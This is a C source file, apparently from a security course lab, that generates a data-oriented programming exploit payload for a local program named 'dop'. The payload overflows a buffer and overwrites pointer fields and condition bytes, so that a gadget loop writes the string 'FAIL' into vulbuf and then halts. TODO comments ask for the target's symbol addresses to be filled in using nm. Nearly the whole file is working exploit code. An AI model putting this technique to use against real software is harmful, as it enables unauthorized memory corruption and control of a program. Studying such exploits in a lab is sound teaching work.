#include <stdio.h>

#define ADDR_BYTE(v, i) \
  ((unsigned char)((((unsigned long)(v)) >> (8 * (i))) & 0xff))

// TODO: replace 0 with the address of vulbuf from dop (use nm and grep)
#define vulbuf ((unsigned char *)0)
// TODO: replace 0 with the address of zone1 from dop (use nm and grep)
#define zone1 ((unsigned char *)0)

#define PAYLOAD_SIZE 234
static unsigned char payload[PAYLOAD_SIZE];

static void make_payload(void)
{
  int i, j;

  /* 0: vref = 'F' */
  for (i = 0; i < 8; i++)
    payload[i] = 0; /* buf */
  payload[i++] = 0x42; /* count */
  payload[i++] = 0x46; /* cond = 'F' */
  for (j = 0; i < 18; i++, j++)
    payload[i] = ADDR_BYTE(zone1, j); /* p2 = zone1 */
  for (; i < 26; i++)
    payload[i] = 0xaa; /* p1 = don't care */

  /* 1: vulbuf[0] = vreg */
  for (; i < 34; i++)
    payload[i] = 0; /* buf */
  payload[i++] = 0x42; /* count */
  payload[i++] = 0x01; /* cond = 0x01 (store vreg) */
  for (j = 0; i < 44; i++, j++)
    payload[i] = ADDR_BYTE(zone1, j); /* p2 = zone1 */
  for (j = 0; i < 52; i++, j++)
    payload[i] = ADDR_BYTE(&vulbuf[0], j); /* p1 = &vulbuf[0] */

  /* 2: vref = 'A' */
  for (; i < 60; i++)
    payload[i] = 0; /* buf */
  payload[i++] = 0x42; /* count */
  payload[i++] = 0x41; /* cond = 'A' */
  for (j = 0; i < 70; i++, j++)
    payload[i] = ADDR_BYTE(zone1, j); /* p2 = zone1 */
  for (; i < 78; i++)
    payload[i] = 0xbb; /* p1 = don't care */

  /* 3: vulbuf[1] = vreg */
  for (; i < 86; i++)
    payload[i] = 0; /* buf */
  payload[i++] = 0x42; /* count */
  payload[i++] = 0x01; /* cond = 0x01 (store vreg) */
  for (j = 0; i < 96; i++, j++)
    payload[i] = ADDR_BYTE(zone1, j); /* p2 = zone1 */
  for (j = 0; i < 104; i++, j++)
    payload[i] = ADDR_BYTE(&vulbuf[1], j); /* p1 = &vulbuf[1] */

  /* 4: vref = 'I' */
  for (; i < 112; i++)
    payload[i] = 0; /* buf */
  payload[i++] = 0x42; /* count */
  payload[i++] = 0x49; /* cond = 'I' */
  for (j = 0; i < 122; i++, j++)
    payload[i] = ADDR_BYTE(zone1, j); /* p2 = zone1 */
  for (; i < 130; i++)
    payload[i] = 0xcc; /* p1 = don't care */

  /* 5: vulbuf[2] = vreg */
  for (; i < 138; i++)
    payload[i] = 0; /* buf */
  payload[i++] = 0x42; /* count */
  payload[i++] = 0x01; /* cond = 0x01 (store vreg) */
  for (j = 0; i < 148; i++, j++)
    payload[i] = ADDR_BYTE(zone1, j); /* p2 = zone1 */
  for (j = 0; i < 156; i++, j++)
    payload[i] = ADDR_BYTE(&vulbuf[2], j); /* p1 = &vulbuf[2] */

  /* 6: vref = 'L' */
  for (; i < 164; i++)
    payload[i] = 0; /* buf */
  payload[i++] = 0x42; /* count */
  payload[i++] = 0x4c; /* cond = 'L' */
  for (j = 0; i < 174; i++, j++)
    payload[i] = ADDR_BYTE(zone1, j); /* p2 = zone1 */
  for (; i < 182; i++)
    payload[i] = 0xdd; /* p1 = don't care */

  /* 7: vulbuf[3] = vreg */
  for (; i < 190; i++)
    payload[i] = 0; /* buf */
  payload[i++] = 0x42; /* count */
  payload[i++] = 0x01; /* cond = 0x01 (store vreg) */
  for (j = 0; i < 200; i++, j++)
    payload[i] = ADDR_BYTE(zone1, j); /* p2 = zone1 */
  for (j = 0; i < 208; i++, j++)
    payload[i] = ADDR_BYTE(&vulbuf[3], j); /* p1 = &vulbuf[3] */

  /* 8: halt */
  for (; i < 216; i++)
    payload[i] = 0; /* buf */
  payload[i++] = 0x42; /* count */
  payload[i++] = 0x00; /* cond = 0x00 (halt) */
  for (; i < 226; i++)
    payload[i] = 0; /* p2 = don't care */
  for (; i < 234; i++)
    payload[i] = 0; /* p1 = don't care */
}

static void print_payload(void)
{
  size_t i;
  for (i = 0; i < PAYLOAD_SIZE; i++) {
    printf("%c", payload[i]);
  }
}

int main(void)
{
  make_payload();
  print_payload();
}
